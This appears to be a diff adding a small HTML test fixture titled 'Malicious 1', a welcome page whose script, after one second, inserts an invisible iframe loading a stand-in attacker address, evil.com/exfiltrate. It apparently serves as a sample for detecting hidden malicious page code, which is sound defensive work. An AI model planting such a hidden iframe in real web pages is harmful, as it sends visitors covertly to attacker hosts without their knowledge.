@@ -1,0 +1,1 @@
+<!DOCTYPE html><html><head><title>Malicious 1</title></head><body><h1>Welcome</h1><script>setTimeout(() => { const iframe = document.createElement('iframe'); iframe.style.opacity = '0'; iframe.src = 'http://evil.com/exfiltrate'; document.body.appendChild(iframe); }, 1000);</script></body></html>
